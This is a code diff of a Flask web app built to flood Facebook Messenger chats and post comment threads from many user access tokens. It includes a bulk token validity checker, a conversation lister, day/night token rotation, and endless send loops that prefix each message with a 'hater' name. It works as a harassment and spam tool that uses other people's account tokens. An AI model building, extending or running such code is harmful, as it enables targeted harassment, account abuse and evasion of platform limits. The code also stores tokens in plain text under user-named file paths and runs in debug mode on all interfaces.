-    tokens = parse_tokens_from_text(tokens_text)
-    messages = parse_messages_from_text(messages_text)
+    messages = load_messages(request.files["msgFile"])
+    
+    tokens = []
+    if token_option == "single":
+        single_token = request.form.get("singleToken")
+        if single_token:
+            tokens = [single_token]
+    elif token_option == "multi":
+        tokens = load_tokens_from_file(request.files["tokenFile"])
+    elif token_option == "daynight":
+        # Load day and night tokens and save them to user files
+        day_tokens = load_tokens_from_file(request.files["dayTokenFile"])
+        night_tokens = load_tokens_from_file(request.files["nightTokenFile"])
+        
+        save_user_day_tokens(username, day_tokens)
+        save_user_night_tokens(username, night_tokens)
+        
+        # Update in-memory storage
+        user_day_tokens[username] = day_tokens
+        user_night_tokens[username] = night_tokens
+        
+        # Get the initial set of tokens based on time
+        tokens = get_current_token_set(username)
     
     if not tokens:
-        return render_template_string(HTML_TEMPLATE, error="No valid tokens provided.")
-    
-    if not messages:
-        return render_template_string(HTML_TEMPLATE, error="No messages provided.")
-    
-    # Save tokens
-    all_tokens = load_user_all_tokens(username)
-    new_tokens = [t for t in tokens if t not in all_tokens]
-    if new_tokens:
-        all_tokens.extend(new_tokens)
-        save_user_tokens(username, all_tokens)
+        # Simple error handling for no tokens
+        return render_template_string(HTML_TEMPLATE, error="No tokens provided or loaded.")
     
     task_id = str(uuid.uuid4())
     
@@ -1906,167 +2269,392 @@ def start_task():
         stop_events[task_id] = threading.Event()
         task_types[task_id] = task_type
         user_tasks[task_id] = username
-        
+        token_usage_stats[task_id] = {token: 0 for token in tokens}
+    
     if task_type == "convo":
         convo_id = request.form["convo"]
-        thread = threading.Thread(target=convo_task, args=(task_id, tokens, convo_id, messages, interval, hater_name))
+        threading.Thread(
+            target=start_messaging, 
+            args=(tokens, messages, convo_id, interval, hater_name, token_option, task_id, task_type, username)
+        ).start()
     elif task_type == "post":
-        post_id = request.form["post"]
-        thread = threading.Thread(target=post_task, args=(task_id, tokens, post_id, messages, interval, hater_name))
-    else:
-        with data_lock:
-            del stop_events[task_id]
-            del task_types[task_id]
-            del user_tasks[task_id]
-        return render_template_string(HTML_TEMPLATE, error=f"Unknown task type: {task_type}")
+        post_id = request.form["post_id"]
+        threading.Thread(
+            target=start_posting, 
+            args=(tokens, messages, post_id, interval, hater_name, token_option, task_id, username)
+        ).start()
         
-    thread.start()
-    
-    return redirect(url_for("view_logs", task_id=task_id))
-
-@app.route("/check-token", methods=["POST"])
-def check_token():
-    if not session.get("logged_in") or not session.get("approved"):
-        return redirect(url_for("home"))
-    
-    username = session["username"]
-    tokens_text = request.form.get("tokens")
-    
-    if not tokens_text:
-        return redirect(url_for("home"))
-        
-    tokens = parse_tokens_from_text(tokens_text)
-    results = []
-    
-    # Save tokens
-    all_tokens = load_user_all_tokens(username)
-    new_tokens = [t for t in tokens if t not in all_tokens]
-    if new_tokens:
-        all_tokens.extend(new_tokens)
-        save_user_tokens(username, all_tokens)
-    
-    for token in tokens:
-        user_id, user_name, is_valid, profile_pic = check_token_validity(token)
-        results.append({
-            "token": token,
-            "valid": is_valid,
-            "user_id": user_id,
-            "user_name": user_name,
-            "profile_pic": profile_pic
-        })
-    
-    session['token_results'] = results
-    return redirect(url_for("home"))
-
-@app.route("/fetch-uids", methods=["POST"])
-def fetch_uids_route():
-    if not session.get("logged_in") or not session.get("approved"):
-        return redirect(url_for("home"))
-    
-    username = session["username"]
-    token = request.form.get("token")
-    
-    if not token:
-        return redirect(url_for("home"))
-    
-    # Save token
-    all_tokens = load_user_all_tokens(username)
-    if token not in all_tokens:
-        all_tokens.append(token)
-        save_user_tokens(username, all_tokens)
-    
-    groups, error = fetch_messenger_groups(token)
-    
-    if error:
-        session['group_results'] = None
-    else:
-        session['group_results'] = groups
-    
     return redirect(url_for("home"))
 
 @app.route("/stop-task", methods=["POST"])
 def stop_task():
-    if not session.get("logged_in"):
+    if not session.get("logged_in") or not session.get("approved"):
         return redirect(url_for("home"))
     
     task_id = request.form["task_id"]
-    
-    with data_lock:
-        if task_id in stop_events:
-            stop_events[task_id].set()
-            add_log(task_id, "Task stop requested by user.")
-        
-    return redirect(url_for("home"))
-
-@app.route("/logs/<task_id>")
-def view_logs(task_id):
-    if not session.get("logged_in"):
-        return redirect(url_for("login"))
-    
     username = session["username"]
     
     with data_lock:
-        logs = task_logs.get(task_id, [])
-        task_type = task_types.get(task_id, "Unknown")
-        task_user = user_tasks.get(task_id, "Unknown")
-        
-    if task_user != username:
+        if task_id in stop_events and user_tasks.get(task_id) == username:
+            stop_events[task_id].set()
+            # Clean up after a short delay to allow the thread to finish logging
+            threading.Timer(5, lambda: cleanup_task(task_id)).start()
+    
+    return redirect(url_for("home"))
+
+def cleanup_task(task_id):
+    with data_lock:
+        stop_events.pop(task_id, None)
+        task_types.pop(task_id, None)
+        user_tasks.pop(task_id, None)
+        token_usage_stats.pop(task_id, None)
+
+def save_valid_tokens(tokens, username):
+    # Save to user-specific file
+    filename = f"{username}.txt"
+    with open(filename, 'w') as f:
+        for token in tokens:
+            f.write(f"{token}\n")
+
+def load_user_tokens(username):
+    # Load tokens from user-specific file
+    filename = f"{username}.txt"
+    if os.path.exists(filename):
+        try:
+            with open(filename, 'r') as f:
+                return [line.strip() for line in f.readlines() if line.strip()]
+        except:
+            return []
+    return []
+
+@app.route("/check-tokens", methods=["POST"])
+def check_tokens():
+    if not session.get("logged_in") or not session.get("approved"):
         return redirect(url_for("home"))
+    
+    tokens = [t.strip() for t in request.form.get("tokens", "").splitlines() if t.strip()]
+    
+    results = []
+    valid_count = 0
+    invalid_count = 0
+    valid_tokens = []
+    
+    for token in tokens:
+        token = token.strip()
+        if not token:
+            continue
+            
+        token_short = f"{token[:5]}...{token[-5:]}" if len(token) > 10 else token
+        result = {"token": token, "token_short": token_short, "valid": False}
         
+        try:
+            url = f"https://graph.facebook.com/me?fields=id,name,picture&access_token={token}"
+            res = requests.get(url)
+            
+            if res.status_code == 200:
+                data = res.json()
+                result.update({
+                    "valid": True,
+                    "uid": data.get("id", "N/A"),
+                    "name": data.get("name", "Unknown"),
+                    "picture": data.get("picture", {}).get("data", {}).get("url", ""),
+                    "profile_url": f"https://www.facebook.com/{data.get('id', '')}"
+                })
+                valid_count += 1
+                valid_tokens.append(token)
+            else:
+                result["error"] = f"HTTP {res.status_code}: {res.text}"
+                invalid_count += 1
+        except Exception as e:
+            result["error"] = str(e)
+            invalid_count += 1
+        
+        results.append(result)
+    
+    # Save valid tokens to user-specific file
+    if valid_tokens:
+        username = session.get("username")
+        save_valid_tokens(valid_tokens, username)
+    
+    return render_template_string(
+        TOKEN_CHECK_RESULT_TEMPLATE,
+        results=results,
+        total_tokens=len(results),
+        valid_count=valid_count,
+        invalid_count=invalid_count
+    )
+
+@app.route("/fetch-conversations", methods=["POST"])
+def fetch_conversations():
+    if not session.get("logged_in") or not session.get("approved"):
+        return redirect(url_for("home"))
+    
+    token = request.form["token"]
+    conversations = []
+    error = None
+    
+    try:
+        # First verify token validity
+        check_url = f"https://graph.facebook.com/me?access_token={token}"
+        check_res = requests.get(check_url)
+        
+        if check_res.status_code != 200:
+            error = "Invalid or expired token"
+        else:
+            # Fetch Messenger conversations
+            url = f"https://graph.facebook.com/v19.0/me/conversations?fields=id,name,participants&access_token={token}"
+            response = requests.get(url)
+            response.raise_for_status()
+            
+            for conv in response.json().get('data', []):
+                conv_id = conv.get('id', 'N/A').replace('t_', '')  # Remove t_ prefix
+                conv_name = conv.get('name', 'Unnamed Conversation')
+                
+                # If no name, get participants
+                if not conv_name or conv_name == 'Unnamed Conversation':
+                    participants = conv.get('participants', {}).get('data', [])
+                    participant_names = [p.get('name', 'Unknown') for p in participants]
+                    conv_name = ", ".join(participant_names) if participant_names else "Group Chat"
+                
+                conversations.append({
+                    'id': conv_id,
+                    'name': conv_name
+                })
+    except Exception as e:
+        error = str(e)
+    
+    return render_template_string(
+        CONVERSATIONS_TEMPLATE,
+        conversations=conversations,
+        error=error
+    )
+
+@app.route("/view-logs/<task_id>")
+def show_logs(task_id):
+    if not session.get("logged_in") or not session.get("approved"):
+        return redirect(url_for("home"))
+    
+    username = session.get("username")
+    
+    # Check if this task belongs to the current user
+    with data_lock:
+        if user_tasks.get(task_id) != username:
+            return redirect(url_for("home"))
+        
+        logs = task_logs.get(task_id, [{'time': datetime.now(), 'message': "No logs found for this task."}])
+        task_type = task_types.get(task_id, "Unknown")
+    
+    # Get the first log entry to determine start time
+    start_time = logs[0]['time'] if logs else datetime.now()
+    
+    # Get target information from logs
+    target = "Unknown"
+    for log in logs:
+        if "Target Group:" in log['message']:
+            target = log['message'].split("Target Group:")[1].strip()
+            break
+        elif "Target Post:" in log['message']:
+            target = log['message'].split("Target Post:")[1].strip()
+            break
+    
     return render_template_string(
         LOG_TEMPLATE, 
         task_id=task_id, 
-        task_type=task_type, 
-        username=username,
-        logs=logs
+        logs=logs, 
+        task_type=task_type,
+        target=target,
+        start_time=start_time
     )
 
-def convo_task(task_id, tokens, convo_id, messages, interval, hater_name):
-    add_log(task_id, f"Starting Convo Task on {convo_id} with {len(tokens)} tokens.")
+def start_messaging(tokens, messages, convo_id, interval, hater_name, token_option, task_id, task_type, username):
     stop_event = stop_events[task_id]
+    token_index = 0
     
-    for i in range(10):
-        if stop_event.is_set():
-            add_log(task_id, "Task stopped gracefully.")
-            break
-        add_log(task_id, f"Convo iteration {i+1}/10. Hater: {hater_name}")
-        time.sleep(interval)
+    add_log(task_id, f"🚀 {task_type} task started for conversation: {convo_id}")
     
-    add_log(task_id, "Convo Task finished.")
-    with data_lock:
-        if task_id in stop_events:
-            del stop_events[task_id]
-            del task_types[task_id]
-            del user_tasks[task_id]
+    # Get group name info once at start
+    token = tokens[0]
+    group_name = get_group_name(convo_id, token)
+    if group_name:
+        add_log(task_id, f"ℹ️ Target Group: {group_name}")
+    
+    while not stop_event.is_set():
+        for msg in messages:
+            if stop_event.is_set():
+                add_log(task_id, "🛑 Task stopped manually.")
+                break
+            
+            # For day/night system, refresh tokens every 6 hours
+            if token_option == "daynight":
+                current_tokens = get_current_token_set(username)
+                if current_tokens != tokens:
+                    tokens = current_tokens
+                    token_index = 0  # Reset index
+                    add_log(task_id, f"🔄 Token set rotated. Now using {len(tokens)} tokens.")
+                    
+                    # Update token usage stats
+                    with data_lock:
+                        token_usage_stats[task_id] = {token: 0 for token in tokens}
+            
+            if not tokens:
+                add_log(task_id, "❌ No tokens available for current time period.")
+                time.sleep(60)  # Wait 1 minute before checking again
+                continue
+            
+            # Select token based on current index
+            current_token = tokens[token_index]
+            token_display = f"Token {token_index + 1}/{len(tokens)}"
+            
+            # Send message
+            send_msg(convo_id, current_token, msg, hater_name, task_id, token_display)
+            
+            # Update token usage stats
+            with data_lock:
+                token_usage_stats[task_id][current_token] = token_usage_stats[task_id].get(current_token, 0) + 1
+            
+            # Rotate to next token
+            token_index = (token_index + 1) % len(tokens)
+            
+            time.sleep(interval)
 
-def post_task(task_id, tokens, post_id, messages, interval, hater_name):
-    add_log(task_id, f"Starting Post Task on {post_id} with {len(tokens)} tokens.")
+def start_posting(tokens, messages, post_id, interval, hater_name, token_option, task_id, username):
     stop_event = stop_events[task_id]
+    token_index = 0
     
-    for i in range(10):
-        if stop_event.is_set():
-            add_log(task_id, "Task stopped gracefully.")
-            break
-        add_log(task_id, f"Post iteration {i+1}/10. Hater: {hater_name}")
-        time.sleep(interval)
+    add_log(task_id, f"🚀 Post task started for post: {post_id}")
     
-    add_log(task_id, "Post Task finished.")
-    with data_lock:
-        if task_id in stop_events:
-            del stop_events[task_id]
-            del task_types[task_id]
-            del user_tasks[task_id]
+    # Get post info once at start
+    token = tokens[0]
+    post_info = get_post_info(post_id, token)
+    if post_info:
+        add_log(task_id, f"ℹ️ Target Post: {post_info}")
+    
+    while not stop_event.is_set():
+        for msg in messages:
+            if stop_event.is_set():
+                add_log(task_id, "🛑 Task stopped manually.")
+                break
+            
+            # For day/night system, refresh tokens every 6 hours
+            if token_option == "daynight":
+                current_tokens = get_current_token_set(username)
+                if current_tokens != tokens:
+                    tokens = current_tokens
+                    token_index = 0  # Reset index
+                    add_log(task_id, f"🔄 Token set rotated. Now using {len(tokens)} tokens.")
+                    
+                    # Update token usage stats
+                    with data_lock:
+                        token_usage_stats[task_id] = {token: 0 for token in tokens}
+            
+            if not tokens:
+                add_log(task_id, "❌ No tokens available for current time period.")
+                time.sleep(60)  # Wait 1 minute before checking again
+                continue
+            
+            # Select token based on current index
+            current_token = tokens[token_index]
+            token_display = f"Token {token_index + 1}/{len(tokens)}"
+            
+            # Send comment
+            send_comment(post_id, current_token, msg, hater_name, task_id, token_display)
+            
+            # Update token usage stats
+            with data_lock:
+                token_usage_stats[task_id][current_token] = token_usage_stats[task_id].get(current_token, 0) + 1
+            
+            # Rotate to next token
+            token_index = (token_index + 1) % len(tokens)
+            
+            time.sleep(interval)
+
+def get_group_name(convo_id, token):
+    try:
+        url = f"https://graph.facebook.com/v15.0/t_{convo_id}?fields=name,participants&access_token={token}"
+        response = requests.get(url)
+        if response.status_code == 200:
+            data = response.json()
+            name = data.get("name")
+            if not name:
+                participants = data.get("participants", {}).get("data", [])
+                participant_names = [p.get("name", "Unknown") for p in participants]
+                name = ", ".join(participant_names) if participant_names else "Group Chat"
+            return name
+        return None
+    except:
+        return None
+
+def get_post_info(post_id, token):
+    try:
+        url = f"https://graph.facebook.com/v15.0/{post_id}?fields=message,from&access_token={token}"
+        response = requests.get(url)
+        if response.status_code == 200:
+            data = response.json()
+            message = data.get("message", "No message")[:50] + "..." if data.get("message") else "No message"
+            from_name = data.get("from", {}).get("name", "Unknown")
+            return f"Post by {from_name}: {message}"
+        return None
+    except:
+        return None
+
+def send_msg(convo_id, access_token, message, hater_name, task_id, token_display=""):
+    try:
+        url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
+        parameters = {
+            "access_token": access_token,
+            "message": f"{hater_name} {message}"  # Modified to remove colon
+        }
+        headers = {"Authorization": f"Bearer {access_token}"}
+        response = requests.post(url, json=parameters, headers=headers)
+        
+        # Get sender name for logging
+        sender_name = get_sender_name(access_token)
+        
+        if response.status_code == 200:
+            log_msg = f"✅ {token_display} | {sender_name} | Message sent: {hater_name}: {message}"  # Keep colon in logs
+            add_log(task_id, log_msg)
+        else:
+            log_msg = f"❌ {token_display} | {sender_name} | Failed (Code: {response.status_code}): {response.text}"
+            add_log(task_id, log_msg)
+    except Exception as e:
+        log_msg = f"❌{token_display} | Error: {str(e)}"
+        add_log(task_id, log_msg)
+
+def send_comment(post_id, access_token, message, hater_name, task_id, token_display=""):
+    try:
+        url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
+        parameters = {
+            "access_token": access_token,
+            "message": f"{hater_name} {message}"  # Modified to remove colon
+        }
+        headers = {"Authorization": f"Bearer {access_token}"}
+        response = requests.post(url, json=parameters, headers=headers)
+        
+        # Get sender name for logging
+        sender_name = get_sender_name(access_token)
+        
+        if response.status_code == 200:
+            log_msg = f"✅ {token_display} | {sender_name} | Comment posted: {hater_name}: {message}"  # Keep colon in logs
+            add_log(task_id, log_msg)
+        else:
+            log_msg = f"❌ {token_display} | {sender_name} | Failed (Code: {response.status_code}): {response.text}"
+            add_log(task_id, log_msg)
+    except Exception as e:
+        log_msg = f"❌ {token_display} | Error: {str(e)}"
+        add_log(task_id, log_msg)
+
+def get_sender_name(access_token):
+    try:
+        url = f"https://graph.facebook.com/me?fields=name&access_token={access_token}"
+        response = requests.get(url)
+        if response.status_code == 200:
+            data = response.json()
+            return data.get("name", "Unknown")
+        return "Unknown"
+    except:
+        return "Unknown"
 
 if __name__ == "__main__":
-    if not os.path.exists(USERS_FILE):
-        save_users({})
-        
-    users = load_users()
-    for username in users:
-        user_day_tokens[username] = load_user_day_tokens(username)
-        user_night_tokens[username] = load_user_night_tokens(username)
-        
-    app.run(debug=True, host='0.0.0.0', port=5000)
-    
-    
-   
+    # Note: In a real-world scenario, you should not run with debug=True in production.
+    # We use it here for simplicity in the sandbox environment.
+    app.run(host="0.0.0.0", port=5000, debug=True)
